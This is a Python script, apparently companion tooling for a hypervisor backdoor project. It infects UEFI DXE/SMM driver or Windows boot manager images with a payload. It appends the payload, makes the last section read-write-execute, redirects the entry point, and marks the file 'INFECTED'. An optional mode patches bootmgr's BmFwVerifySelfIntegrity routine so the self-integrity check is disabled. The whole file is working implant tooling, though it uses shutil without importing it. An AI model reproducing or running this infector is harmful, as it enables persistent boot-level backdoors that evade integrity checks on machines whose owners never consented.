#!/usr/bin/env python

import sys, os, time
from struct import pack, unpack
from optparse import OptionParser, make_option

# See struct _INFECTOR_CONFIG in DmaBackdoorHv.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QQQQQ'
INFECTOR_CONFIG_LEN = 8 + 8 + 8 + 8 + 8

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

def patch_win_boot_mgr_integrity(data):

    for i in range(0, len(data) - 0x100):

        '''
            Check for bootmgr!BmFwVerifySelfIntegrity() signature:

                mov     [rsp-30h+arg_0], ecx
                push    rbp
                push    rbx
                push    rsi
                push    rdi
                push    r13
                push    r14
                mov     rbp, rsp
                sub     rsp, 68h
                mov     rax, cs:qword_1014DE10
                xor     edi, edi
                and     [rbp+Src], 0
                and     [rbp+arg_10], 0
                or      [rbp+arg_0], 0FFFFFFFFh
                or      [rbp+arg_8], 0FFFFFFFFh
        '''

        if data[i + 0x00] == '\x89' and data[i + 0x01] == '\x4c' and \
           data[i + 0x26] == '\x83' and data[i + 0x27] == '\x4d' and data[i + 0x28] == '\x38' and data[i + 0x29] == '\xff' and \
           data[i + 0x2a] == '\x83' and data[i + 0x2b] == '\x4d' and data[i + 0x2c] == '\x40' and data[i + 0x2d] == '\xff':

            # xor eax, eax / ret
            patch = '\x33\xc0\xc3'

            print('[+] bootmgr!BmFwVerifySelfIntegrity() signature found at offset 0x%.8x' % i)

            # patch the function to disable self check
            return data[: i] + patch + data[i + len(patch) :]

    print('ERROR: Unable to find bootmgr!BmFwVerifySelfIntegrity() function')

    return None

def infect(src, payload, dst = None, patch_integrity = False):

    try:

        import pefile

    except ImportError:

        print('ERROR: pefile is not installed')
        exit(-1)

    def _infector_config_offset(pe):
        
        for section in pe.sections:

            # find .conf section of payload image
            if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                return section.PointerToRawData

        raise Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION)

    def _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    def _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        return data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    # load target image
    pe_src = pefile.PE(src)

    # load payload image
    pe_payload = pefile.PE(payload)
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise Exception('%s is already infected' % src)        

    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        raise Exception('Architecture missmatch')

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    val_1, val_2, val_3, conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data) 

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise Exception('Last section virtual size must be less or equal than raw size')

    raw_size = last_section.PointerToRawData + last_section.SizeOfRawData 

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    print('Original entry point RVA is 0x%.8x' % conf_ep_old )
    print('Original %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  

    print('Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0])

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    

    print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
    print('New %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # get infected image data
    data = pe_src.write()[: raw_size] + data

    if patch_integrity:

        # patch self-integrity checks of windows boot manager
        data = patch_win_boot_mgr_integrity(str(data))
        if data is None:

            # error occurred
            return None

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data

def main():    

    option_list = [

        make_option('-i', '--infect', dest = 'infect', default = None,
            help = 'infect existing DXE, SMM or combined driver image'),

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'infect payload path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('--patch-integrity-checks', dest = 'patch_integrity', default = False, action = 'store_true',
            help = 'file path to save infected file')
    ]

    parser = OptionParser(option_list = option_list)
    options, args = parser.parse_args()

    if options.infect is not None:

        if options.payload is None:

            print('ERROR: --payload must be specified')
            return -1

        print('[+] Target image to infect: %s' % options.infect)
        print('[+] Infector payload: %s' % options.payload)

        if options.output is None:

            backup = options.infect + '.bak'
            options.output = options.infect

            print('[+] Backup: %s' % backup)

            # backup original file
            shutil.copyfile(options.infect, backup)

        print('[+] Output file: %s' % options.output)

        # infect source file with specified payload
        if infect(options.infect, options.payload, 
                  dst = options.output, patch_integrity = options.patch_integrity) is not None:

            print('[+] DONE')

        return 0

    else:

        print('No actions specified, try --help')
        return -1    
    
if __name__ == '__main__':
    
    exit(main())

#
# EoF
#
